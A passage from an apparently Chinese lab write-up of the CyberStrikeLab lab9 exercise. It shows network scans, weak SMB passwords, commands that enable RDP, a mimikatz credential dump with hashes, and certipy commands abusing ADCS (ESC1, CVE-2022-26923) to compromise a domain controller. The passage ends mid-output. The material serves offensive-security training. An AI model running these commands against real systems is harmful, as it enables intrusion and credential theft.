系统信息 10.6.6.55 [Windows Server 2016 Standard 14393]</span><br><span class="line">[2025-05-21 11:40:36] [SUCCESS] SMB认证成功 10.6.6.88:445 administrator:qwe123!@#</span><br><span class="line">[2025-05-21 11:40:46] [INFO] SMB2共享信息 10.6.6.88:445 admin Pass:123 共享:[ADMIN$ C$ IPC$ smb]</span><br><span class="line">[2025-05-21 11:40:46] [INFO] SMB2共享信息 10.6.6.88:445 admin Pass:Admin@123 共享:[ADMIN$ C$ IPC$ smb]</span><br><span class="line">[2025-05-21 11:40:46] [INFO] SMB2共享信息 10.6.6.88:445 admin Pass:admin@123 共享:[ADMIN$ C$ IPC$ smb]</span><br><span class="line">[2025-05-21 11:40:46] [INFO] SMB2共享信息 10.6.6.88:445 admin Pass:admin1 共享:[ADMIN$ C$ IPC$ smb]</span><br><span class="line">[2025-05-21 11:40:46] [INFO] SMB2共享信息 10.6.6.88:445 admin Pass:admin111 共享:[ADMIN$ C$ IPC$ smb]</span><br><span class="line">[2025-05-21 11:40:46] [INFO] SMB2共享信息 10.6.6.88:445 admin Pass:admin123!@# 共享:[ADMIN$ C$ IPC$ smb]</span><br><span class="line">[2025-05-21 11:40:46] [INFO] SMB2共享信息 10.6.6.88:445 admin Pass:admin#123 共享:[ADMIN$ C$ IPC$ smb]</span><br><span class="line">[2025-05-21 11:43:13] [SUCCESS] 扫描已完成: 26/26</span><br></pre></td></tr></table></figure><p>后来重新传了个旧版本的，也还是不太行，看别的师傅的2.0.0版本最好</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\Public\Videos&gt;fscan.exe -h 10.6.6.10/24</span><br><span class="line">fscan.exe -h 10.6.6.10/24</span><br><span class="line"></span><br><span class="line">   ___                              _</span><br><span class="line">  / _ \     ___  ___ _ __ __ _  ___| | __</span><br><span class="line"> / /_\/____/ __|/ __| &#x27;__/ _` |/ __| |/ /</span><br><span class="line">/ /_\\_____\__ \ (__| | | (_| | (__|   &lt;</span><br><span class="line">\____/     |___/\___|_|  \__,_|\___|_|\_\</span><br><span class="line">                     fscan version: 1.8.1</span><br><span class="line">start infoscan</span><br><span class="line">(icmp) Target 10.6.6.10       is alive</span><br><span class="line">(icmp) Target 10.6.6.55       is alive</span><br><span class="line">(icmp) Target 10.6.6.88       is alive</span><br><span class="line">[*] Icmp alive hosts len is: 3</span><br><span class="line">10.6.6.55:88 open</span><br><span class="line">10.6.6.10:3306 open</span><br><span class="line">10.6.6.88:445 open</span><br><span class="line">10.6.6.55:445 open</span><br><span class="line">10.6.6.10:445 open</span><br><span class="line">10.6.6.88:139 open</span><br><span class="line">10.6.6.55:139 open</span><br><span class="line">10.6.6.10:139 open</span><br><span class="line">10.6.6.88:135 open</span><br><span class="line">10.6.6.55:135 open</span><br><span class="line">10.6.6.10:135 open</span><br><span class="line">10.6.6.55:80 open</span><br><span class="line">10.6.6.10:80 open</span><br><span class="line">[*] alive ports len is: 13</span><br><span class="line">start vulscan</span><br><span class="line">[+] NetInfo:</span><br><span class="line">[*]10.6.6.10</span><br><span class="line">   [-&gt;]WIN-784BAKDI0AC</span><br><span class="line">   [-&gt;]172.5.33.6</span><br><span class="line">   [-&gt;]10.6.6.10</span><br><span class="line">[+] NetInfo:</span><br><span class="line">[*]10.6.6.88</span><br><span class="line">   [-&gt;]cyberweb</span><br><span class="line">   [-&gt;]10.6.6.88</span><br><span class="line">[+] NetInfo:</span><br><span class="line">[*]10.6.6.55</span><br><span class="line">   [-&gt;]DC</span><br><span class="line">   [-&gt;]10.6.6.55</span><br><span class="line">[*] WebTitle:http://10.6.6.55          code:200 len:703    title:IIS Windows Server</span><br><span class="line">[*] 10.6.6.88  (Windows Server 2016 Standard 14393)</span><br><span class="line">[*] 10.6.6.55  (Windows Server 2016 Standard 14393)</span><br><span class="line">[*] 10.6.6.88            CYBERSTRIKELAB\CYBERWEB          Windows Server 2016 Standard 14393</span><br><span class="line">[*] 10.6.6.55      [+]DC __MSBROWSE__\DC                Windows Server 2016 Standard 14393</span><br><span class="line">[*] WebTitle:http://10.6.6.10          code:200 len:77286  title:中文网页标题</span><br><span class="line">[+] http://10.6.6.55 poc-yaml-active-directory-certsrv-detect</span><br></pre></td></tr></table></figure><p>整理一下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">域名：cyberstrikelab.com</span><br><span class="line">10.6.6.10  172.5.33.6（已拿下）  WIN-784BAKDI0AC  入口机 CMSeasy sql注入获取md5密码、后台任意文件上传</span><br><span class="line">10.6.6.88   cyberweb    smb弱口令 administrator  qwe123!@#</span><br><span class="line">10.6.6.55   DC          AD-CS   </span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="横向移动"><a href="#横向移动" class="headerlink" title="横向移动"></a>横向移动</h2><p>那么接下来 我们就是先拿下一个域内用户</p><p>然后用ADCS拿下域控</p><p>先使用smb横向至10.6.6.88</p><p><img src="/img/cyberstrikelab-lab9/9.png"></p><p>查看一下权限，就是system权限</p><p><img src="/img/cyberstrikelab-lab9/10.png"></p><p>前面fscan没扫到3389，但是我们是system</p><p>直接开启该端口进行rdp</p><p>这是问了AI的命令启动</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">#开启rdp</span><br><span class="line">reg add &quot;HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server&quot; /v fDenyTSConnections /t REG_DWORD /d 0 /f</span><br><span class="line">#关闭防火墙的防护</span><br><span class="line">netsh advfirewall firewall set rule group=&quot;remote desktop&quot; new enable=yes</span><br><span class="line"></span><br><span class="line">sc start TermService</span><br><span class="line">   </span><br></pre></td></tr></table></figure><p>启动完之后直接连接</p><p><img src="/img/cyberstrikelab-lab9/11.png"></p><p>我们可以用smb中的服务直接抓取密码，或者也可以使用Sweetpotato在rdp内进行提权</p><p><img src="/img/cyberstrikelab-lab9/12.png"></p><p>连上rdp后就可以查看flag2了</p><p><img src="/img/cyberstrikelab-lab9/13.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">域名：cyberstrikelab.com</span><br><span class="line">10.6.6.10  172.5.33.6（已拿下）  WIN-784BAKDI0AC  入口机 CMSeasy sql注入获取md5密码、后台任意文件上传</span><br><span class="line">10.6.6.88   cyberweb （已拿下）   smb administrator  qwe123!@#</span><br><span class="line">10.6.6.55   DC          AD-CS   </span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="flag03-拿下域控"><a href="#flag03-拿下域控" class="headerlink" title="flag03(拿下域控)"></a>flag03(拿下域控)</h2><p>为了方便操作，这里我们直接拖Sweetpotato和mimikatz进去</p><p><img src="/img/cyberstrikelab-lab9/14.png"></p><p>抓取机器用户的hash</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">.\mimikatz.exe &quot;privilege::debug&quot; &quot;sekurlsa::logonpasswords&quot; &quot;exit&quot; &gt; 1.txt</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Authentication Id : 0 ; 23218 (00000000:00005ab2)</span><br><span class="line">Session           : UndefinedLogonType from 0</span><br><span class="line">User Name         : (null)</span><br><span class="line">Domain            : (null)</span><br><span class="line">Logon Server      : (null)</span><br><span class="line">Logon Time        : 2025/5/21 10:32:51</span><br><span class="line">SID               : </span><br><span class="line">msv :</span><br><span class="line"> [00000003] Primary</span><br><span class="line"> * Username : CYBERWEB$</span><br><span class="line"> * Domain   : CYBERSTRIKELAB</span><br><span class="line"> * NTLM     : 331dcbb88d1a4847c97eab7c1c168ac8</span><br><span class="line"> * SHA1     : 0a4c17b8f051223716e86c36f1dec902e266c773</span><br><span class="line">tspkg :</span><br><span class="line">wdigest :</span><br><span class="line">kerberos :</span><br><span class="line">ssp :</span><br><span class="line">credman :</span><br></pre></td></tr></table></figure><h3 id="ADCS"><a href="#ADCS" class="headerlink" title="ADCS"></a>ADCS</h3><p>拿到了域内用户即机器用户CYBERWEB$的hash，那么就只剩下CA的名字了</p><p>这里我们需要用system执行以下命令</p><blockquote><ul><li>System账户拥有完全控制权</li><li>Administrators组仅有读取权限（默认）</li></ul></blockquote><p>administrator</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">C:\x64&gt;CertUtil</span><br><span class="line">CertUtil: -dump 命令成功完成。</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>system</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">C:\Windows\system32&gt;CertUtil</span><br><span class="line">项 0:</span><br><span class="line">  名称:                         `cyberstrikelab-DC-CA&#x27;</span><br><span class="line">  部门:                         `&#x27;</span><br><span class="line">  单位:                         `&#x27;</span><br><span class="line">  区域:                         `&#x27;</span><br><span class="line">  省/自治区:                    `&#x27;</span><br><span class="line">  国家/地区:                    `&#x27;</span><br><span class="line">  配置:                         `DC.cyberstrikelab.com\cyberstrikelab-DC-CA&#x27;</span><br><span class="line">  Exchange 证书:                `&#x27;</span><br><span class="line">  签名证书:                     `&#x27;</span><br><span class="line">  描述:                         `&#x27;</span><br><span class="line">  服务器:                       `DC.cyberstrikelab.com&#x27;</span><br><span class="line">  颁发机构:                     `cyberstrikelab-DC-CA&#x27;</span><br><span class="line">  净化的名称:                   `cyberstrikelab-DC-CA&#x27;</span><br><span class="line">  短名称:                       `cyberstrikelab-DC-CA&#x27;</span><br><span class="line">  净化的短名称:                 `cyberstrikelab-DC-CA&#x27;</span><br><span class="line">  标记:                         `1&#x27;</span><br><span class="line">  Web 注册服务器:               `&#x27;</span><br><span class="line">CertUtil: -dump 命令成功完成。</span><br></pre></td></tr></table></figure><p>获取到CA的名字为<font style="color:rgb(255, 182, 0);">cyberstrikelab-DC-CA</font></p><p><font style="color:rgb(255, 182, 0);"></font></p><p>那么就可以进行ADCS攻击了</p><p><a href="https://xz.aliyun.com/news/13175">https://xz.aliyun.com/news/13175</a></p><p>我们需要先新建一个域内机器用户，因为原机器用户，我们并不知道其明文密码，但是后面的adcs攻击需要明文密码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains4 certipy account create -u CYBERWEB$ -hashes 331dcbb88d1a4847c97eab7c1c168ac8  -dc-ip 10.6.6.55 -user hub -dns DC.cyberstrikelab.com -debug</span><br></pre></td></tr></table></figure><p><img src="/img/cyberstrikelab-lab9/15.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[/home/kali/red/Certipy-4.8.2]</span><br><span class="line">└─# proxychains4 certipy account create -u CYBERWEB$ -hashes 331dcbb88d1a4847c97eab7c1c168ac8  -dc-ip 10.6.6.55 -user hub -dns DC.cyberstrikelab.com -debug</span><br><span class="line">[proxychains] config file found: /etc/proxychains4.conf</span><br><span class="line">[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4</span><br><span class="line">[proxychains] DLL init: proxychains-ng 4.15</span><br><span class="line">Certipy v4.8.2 - by Oliver Lyak (ly4k)</span><br><span class="line"></span><br><span class="line">[+] Authenticating to LDAP server</span><br><span class="line">[proxychains] Strict chain  ...  192.168.72.1:1123  ...  10.6.6.55:636  ...  OK</span><br><span class="line">[+] Bound to ldaps://10.6.6.55:636 - ssl</span><br><span class="line">[+] Default path: DC=cyberstrikelab,DC=com</span><br><span class="line">[+] Configuration path: CN=Configuration,DC=cyberstrikelab,DC=com</span><br><span class="line">[*] Creating new account:</span><br><span class="line">    sAMAccountName                      : hub$</span><br><span class="line">    unicodePwd                          : zgO22XEpVfG6Mr8m</span><br><span class="line">    userAccountControl                  : 4096</span><br><span class="line">    servicePrincipalName                : HOST/hub</span><br><span class="line">                                          RestrictedKrbHost/hub</span><br><span class="line">    dnsHostName                         : DC.cyberstrikelab.com</span><br><span class="line">[*] Successfully created account &#x27;hub$&#x27; with password &#x27;zgO22XEpVfG6Mr8m&#x27;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">certipy find -u &lt;username@domain&gt; -p &lt;password&gt; -dc-ip &lt;dc_ip&gt; -vulnerable -timeout 30 -debug</span><br></pre></td></tr></table></figure><p>用以下的命令探测能打什么漏洞</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains4 certipy find -u &#x27;hub$@cyberstrikelab.com&#x27; -p &#x27;zgO22XEpVfG6Mr8m&#x27; -dc-ip 10.6.6.55 -vulnerable -timeout 30 -debug</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[/home/kali/red/Certipy-4.8.2]</span><br><span class="line">└─# proxychains4 certipy find -u &#x27;hub$@cyberstrikelab.com&#x27; -p &#x27;zgO22XEpVfG6Mr8m&#x27; -dc-ip 10.6.6.55 -vulnerable -timeout 30 -debug</span><br><span class="line">[proxychains] config file found: /etc/proxychains4.conf</span><br><span class="line">[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4</span><br><span class="line">[proxychains] DLL init: proxychains-ng 4.15</span><br><span class="line">Certipy v4.8.2 - by Oliver Lyak (ly4k)</span><br><span class="line"></span><br><span class="line">[+] Authenticating to LDAP server</span><br><span class="line">[proxychains] Strict chain  ...  192.168.72.1:1123  ...  10.6.6.55:636  ...  OK</span><br><span class="line">[+] Bound to ldaps://10.6.6.55:636 - ssl</span><br><span class="line">[+] Default path: DC=cyberstrikelab,DC=com</span><br><span class="line">[+] Configuration path: CN=Configuration,DC=cyberstrikelab,DC=com</span><br><span class="line">[+] Adding Domain Computers to list of current user&#x27;s SIDs</span><br><span class="line">[+] List of current user&#x27;s SIDs:</span><br><span class="line">     CYBERSTRIKELAB.COM\Domain Computers (S-1-5-21-4286488488-1212600890-1604239976-515)</span><br><span class="line">     CYBERSTRIKELAB.COM\hub (S-1-5-21-4286488488-1212600890-1604239976-1105)</span><br><span class="line">     CYBERSTRIKELAB.COM\Users (CYBERSTRIKELAB.COM-S-1-5-32-545)</span><br><span class="line">     CYBERSTRIKELAB.COM\Authenticated Users (CYBERSTRIKELAB.COM-S-1-5-11)</span><br><span class="line">     CYBERSTRIKELAB.COM\Everyone (CYBERSTRIKELAB.COM-S-1-1-0)</span><br><span class="line">[*] Finding certificate templates</span><br><span class="line">[*] Found 34 certificate templates</span><br><span class="line">[*] Finding certificate authorities</span><br><span class="line">[*] Found 1 certificate authority</span><br><span class="line">[*] Found 12 enabled certificate templates</span><br><span class="line">[+] Trying to resolve &#x27;DC.cyberstrikelab.com&#x27; at &#x27;10.6.6.55&#x27;</span><br><span class="line">[*] Trying to get CA configuration for &#x27;cyberstrikelab-DC-CA&#x27; via CSRA</span><br><span class="line">[+] Trying to get DCOM connection for: 224.0.0.1</span><br><span class="line">[proxychains] Strict chain  ...  192.168.72.1:1123  ...  DC.cyberstrikelab.com:135  ...  OK</span><br><span class="line">[!] Got error while trying to get CA configuration for &#x27;cyberstrikelab-DC-CA&#x27; via CSRA: Can&#x27;t find a valid stringBinding to connect</span><br><span class="line">[*] Trying to get CA configuration for &#x27;cyberstrikelab-DC-CA&#x27; via RRP</span><br><span class="line">[proxychains] Strict chain  ...  192.168.72.1:1123  ...  DC.cyberstrikelab.com:445  ...  OK</span><br><span class="line">[!] Failed to connect to remote registry. Service should be starting now. Trying again...</span><br><span class="line">[+] Connected to remote registry at &#x27;DC.cyberstrikelab.com&#x27; (224.0.0.1)</span><br><span class="line">[*] Got CA configuration for &#x27;cyberstrikelab-DC-CA&#x27;</span><br><span class="line">[+] Resolved &#x27;DC.cyberstrikelab.com&#x27; from cache: 224.0.0.1</span><br><span class="line">[+] Connecting to 224.0.0.1:80</span><br><span class="line">[proxychains] Strict chain  ...  192.168.72.1:1123  ...  DC.cyberstrikelab.com:80  ...  OK</span><br><span class="line">[*] Saved BloodHound data to &#x27;20250521084515_Certipy.zip&#x27;. Drag and drop the file into the BloodHound GUI from @ly4k</span><br><span class="line">[*] Saved text output to &#x27;20250521084515_Certipy.txt&#x27;</span><br><span class="line">[*] Saved JSON output to &#x27;20250521084515_Certipy.json&#x27;</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line">Certificate Authorities</span><br><span class="line">  0</span><br><span class="line">    CA Name                             : cyberstrikelab-DC-CA</span><br><span class="line">    DNS Name                            : DC.cyberstrikelab.com</span><br><span class="line">    Certificate Subject                 : CN=cyberstrikelab-DC-CA, DC=cyberstrikelab, DC=com</span><br><span class="line">    Certificate Serial Number           : 652A47597C7F03824B7815EBE474E40B</span><br><span class="line">    Certificate Validity Start          : 2025-04-22 07:45:38+00:00</span><br><span class="line">    Certificate Validity End            : 2030-04-22 07:55:38+00:00</span><br><span class="line">    Web Enrollment                      : Enabled</span><br><span class="line">    User Specified SAN                  : Disabled</span><br><span class="line">    Request Disposition                 : Issue</span><br><span class="line">    Enforce Encryption for Requests     : Enabled</span><br><span class="line">    Permissions</span><br><span class="line">      Owner                             : CYBERSTRIKELAB.COM\Administrators</span><br><span class="line">      Access Rights</span><br><span class="line">        ManageCertificates              : CYBERSTRIKELAB.COM\Administrators</span><br><span class="line">                                          CYBERSTRIKELAB.COM\Domain Admins</span><br><span class="line">                                          CYBERSTRIKELAB.COM\Enterprise Admins</span><br><span class="line">        ManageCa                        : CYBERSTRIKELAB.COM\Administrators</span><br><span class="line">                                          CYBERSTRIKELAB.COM\Domain Admins</span><br><span class="line">                                          CYBERSTRIKELAB.COM\Enterprise Admins</span><br><span class="line">        Enroll                          : CYBERSTRIKELAB.COM\Authenticated Users</span><br><span class="line">    [!] Vulnerabilities</span><br><span class="line">      ESC8                              : Web Enrollment is enabled and Request Disposition is set to Issue</span><br><span class="line">Certificate Templates</span><br><span class="line">  0</span><br><span class="line">    Template Name                       : DC</span><br><span class="line">    Display Name                        : DC</span><br><span class="line">    Certificate Authorities             : cyberstrikelab-DC-CA</span><br><span class="line">    Enabled                             : True</span><br><span class="line">    Client Authentication               : True</span><br><span class="line">    Enrollment Agent                    : False</span><br><span class="line">    Any Purpose                         : False</span><br><span class="line">    Enrollee Supplies Subject           : True</span><br><span class="line">    Certificate Name Flag               : EnrolleeSuppliesSubject</span><br><span class="line">    Enrollment Flag                     : None</span><br><span class="line">    Private Key Flag                    : 16777216</span><br><span class="line">                                          65536</span><br><span class="line">    Extended Key Usage                  : Client Authentication</span><br><span class="line">    Requires Manager Approval           : False</span><br><span class="line">    Requires Key Archival               : False</span><br><span class="line">    Authorized Signatures Required      : 0</span><br><span class="line">    Validity Period                     : 1 year</span><br><span class="line">    Renewal Period                      : 6 weeks</span><br><span class="line">    Minimum RSA Key Length              : 2048</span><br><span class="line">    Permissions</span><br><span class="line">      Enrollment Permissions</span><br><span class="line">        Enrollment Rights               : CYBERSTRIKELAB.COM\Domain Users</span><br><span class="line">                                          CYBERSTRIKELAB.COM\Domain Admins</span><br><span class="line">                                          CYBERSTRIKELAB.COM\Domain Computers</span><br><span class="line">                                          CYBERSTRIKELAB.COM\Enterprise Admins</span><br><span class="line">                                          CYBERSTRIKELAB.COM\Authenticated Users</span><br><span class="line">      Object Control Permissions</span><br><span class="line">        Owner                           : CYBERSTRIKELAB.COM\Administrator</span><br><span class="line">        Write Owner Principals          : CYBERSTRIKELAB.COM\Domain Admins</span><br><span class="line">                                          CYBERSTRIKELAB.COM\Enterprise Admins</span><br><span class="line">                                          CYBERSTRIKELAB.COM\Administrator</span><br><span class="line">        Write Dacl Principals           : CYBERSTRIKELAB.COM\Domain Admins</span><br><span class="line">                                          CYBERSTRIKELAB.COM\Enterprise Admins</span><br><span class="line">                                          CYBERSTRIKELAB.COM\Administrator</span><br><span class="line">        Write Property Principals       : CYBERSTRIKELAB.COM\Domain Admins</span><br><span class="line">                                          CYBERSTRIKELAB.COM\Enterprise Admins</span><br><span class="line">                                          CYBERSTRIKELAB.COM\Administrator</span><br><span class="line">    [!] Vulnerabilities</span><br><span class="line">      ESC1                              : &#x27;CYBERSTRIKELAB.COM\\Domain Computers&#x27; and &#x27;CYBERSTRIKELAB.COM\\Authenticated Users&#x27; can enroll, enrollee supplies subject and template allows client authentication</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>发现ESC1（和**<font style="color:rgba(0, 0, 0, 0.85);">CVE-2022-26923差不多</font>**）和ESC8都可以打</p><p>但是我们先跟着我看的那位师傅的wp打下面这个吧</p><p><strong><font style="color:rgba(0, 0, 0, 0.85);">CVE-2022-26923（ADCS提权漏洞）</font></strong></p><p><strong><font style="color:rgba(0, 0, 0, 0.85);"></font></strong></p><p>使用创建好的机器账号申请<font style="color:rgb(102, 102, 102);">Machine账户证书，记得加上timeout 30</font></p><p><font style="color:rgb(102, 102, 102);">防止连接超时</font></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains4 certipy req -u &#x27;hub$@cyberstrikelab.com&#x27; -p &#x27;zgO22XEpVfG6Mr8m&#x27; -ca &#x27;cyberstrikelab-DC-CA&#x27; -target 10.6.6.55 -template &#x27;Machine&#x27; -debug -timeout 30 -dc-ip 10.6.6.55</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[/home/kali/red/Certipy-4.8.2]</span><br><span class="line">└─# proxychains4 certipy req -u &#x27;hub$@cyberstrikelab.com&#x27; -p &#x27;zgO22XEpVfG6Mr8m&#x27; -ca &#x27;cyberstrikelab-DC-CA&#x27; -target 10.6.6.55 -template &#x27;Machine&#x27; -debug -timeout 30 -dc-ip 10.6.6.55</span><br><span class="line">[proxychains] config file found: /etc/proxychains4.conf</span><br><span class="line">[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4</span><br><span class="line">[proxychains] DLL init: proxychains-ng 4.15</span><br><span class="line">Certipy v4.8.2 - by Oliver Lyak (ly4k)</span><br><span class="line"></span><br><span class="line">[+] Generating RSA key</span><br><span class="line">[*] Requesting certificate via RPC</span><br><span class="line">[+] Trying to connect to endpoint: ncacn_np:10.6.6.55[\pipe\cert]</span><br><span class="line">[proxychains] Strict chain  ...  192.168.72.1:1123  ...  10.6.6.55:445  ...  OK</span><br><span class="line">[+] Connected to endpoint: ncacn_np:10.6.6.55[\pipe\cert]</span><br><span class="line">[*] Successfully requested certificate</span><br><span class="line">[*] Request ID is 6</span><br><span class="line">[*] Got certificate with DNS Host Name &#x27;DC.cyberstrikelab.com&#x27;</span><br><span class="line">[*] Certificate has no object SID</span><br><span class="line">[*] Saved certificate and private key to &#x27;dc.pfx&#x27;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>利用该证书就可以获得域控机器用户的hash了</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains4 certipy auth -pfx dc.pfx -dc-ip 10.6.6.55 -debug</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[/home/kali/red/Certipy-4.8.2]</span><br><span class="line">└─# proxychains4 certipy auth -pfx dc.pfx -dc-ip 10.6.6.55 -debug</span><br><span class="line">[proxychains] config file found: /etc/proxychains4.conf</span><br><span class="line">[proxychains] preloading 